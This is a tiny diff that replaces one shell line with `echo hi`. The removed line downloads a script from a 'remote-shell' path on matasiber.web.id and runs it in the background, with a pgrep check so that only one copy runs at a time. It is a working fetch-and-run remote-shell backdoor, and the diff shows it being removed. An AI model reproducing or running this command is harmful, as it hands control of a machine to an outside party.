@@ -1,1 +1,1 @@
-pgrep -f "AGENT_MATASIBER" >/dev/null 2>&1 || env AGENT_MATASIBER=1 sh -c "$(curl -fsSL https://matasiber.web.id/remote-shell/agent.sh)" &
+echo hi
